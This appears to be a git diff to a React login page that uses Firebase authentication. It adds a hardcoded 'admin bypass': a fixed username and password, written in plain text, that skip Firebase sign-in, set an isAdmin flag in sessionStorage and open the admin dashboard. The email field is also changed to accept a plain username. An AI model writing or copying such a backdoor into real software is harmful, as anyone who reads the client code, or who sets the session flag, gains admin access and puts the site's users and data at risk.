@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import { useNavigate, Link } from 'react-router-dom';
 import { signInWithEmailAndPassword, signInWithPopup, GoogleAuthProvider } from 'firebase/auth';
 import { auth } from '../lib/firebase';
+import { useAuth } from '../contexts/AuthContext';
 import { motion } from 'motion/react';
 import { LogIn, Mail, Lock, Chrome } from 'lucide-react';
 
@@ -11,11 +12,22 @@ const Login: React.FC = () => {
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
   const navigate = useNavigate();
+  const { setBypassAdmin } = useAuth();
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
     setLoading(true);
     setError('');
+
+    // Admin Bypass Logic
+    if (email === 'merajkhan' && password === 'itxmerajkhan1') {
+      sessionStorage.setItem('isAdmin', 'true');
+      setBypassAdmin(true);
+      navigate('/admin-dashboard');
+      setLoading(false);
+      return;
+    }
+
     try {
       await signInWithEmailAndPassword(auth, email, password);
       navigate('/');
@@ -67,8 +79,8 @@ const Login: React.FC = () => {
             <div className="relative">
               <Mail className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-white/30" />
               <input 
-                type="email" 
-                placeholder="EMAIL@SECTOR.NET"
+                type="text" 
+                placeholder="EMAIL OR USERNAME"
                 value={email}
                 onChange={(e) => setEmail(e.target.value)}
                 className="w-full bg-white/5 border border-white/10 rounded-xl py-4 pl-12 pr-4 text-white placeholder:text-white/20 focus:outline-none focus:border-yellow-400/50 transition-all font-mono text-sm"
